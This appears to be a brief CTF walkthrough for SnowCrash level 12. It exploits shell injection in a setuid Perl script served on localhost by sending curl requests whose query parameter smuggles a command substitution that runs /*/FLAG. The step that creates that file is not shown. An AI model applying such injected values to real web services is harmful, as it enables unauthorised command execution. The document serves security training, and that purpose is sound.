## 1. Connect to level12:

```bash
level11@SnowCrash:~$ su level12
password: *use previously found flag*
```

## 2. See existing files:

```bash
level12@SnowCrash:~$ ls -l
    -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

level12@SnowCrash:~$ cat level12.pl
```

## 3. With the content of `level12.pl`, we can see that we can do a shell injection:
Let's use /*/FLAG to be executed as a command substitution
```bash
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=`/*/FLAG`'
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=$(/*/FLAG)'
```

```bash
level12@SnowCrash:~$ cat /tmp/FLAG
```